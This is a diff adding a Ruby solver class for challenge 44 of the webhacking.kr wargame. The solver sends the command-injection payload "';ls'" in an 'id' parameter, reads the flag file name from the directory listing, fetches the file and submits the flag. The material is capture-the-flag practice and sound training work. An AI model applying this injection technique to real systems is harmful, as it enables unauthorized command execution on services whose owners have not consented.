@@ -1147,6 +1147,48 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 44
+  class Challenge44 < ChallengeBase
+    CHALLENGE = 44
+
+    PORT = 10005
+    PATH = '/'
+    PARAM_ID = 'id'
+    PAYLOAD = "';ls'"
+
+    def initialize(*)
+      super
+      uri = URI(Wargame::BASE_URI)
+      @client = Net::HTTP.new(uri.host, PORT)
+    end
+
+    def exec
+      log('Sending payload')
+      response = post(
+        PATH,
+        { PARAM_ID => PAYLOAD }
+      )
+      unless response.body =~ /(flag_.*)\n/
+        failed
+        return
+      end
+
+      file_name = Regexp.last_match(1)
+      log("Filename: #{file_name}")
+      log('Getting file')
+      response = get("#{PATH}#{file_name}")
+      unless response.body =~ /(FLAG\{.*\})/
+        failed
+        return
+      end
+
+      flag = Regexp.last_match(1)
+      log(flag)
+      check(auth(flag))
+    end
+  end
+
+  ##
   # Challenge 45
   class Challenge45 < ChallengeBase
     CHALLENGE = 45
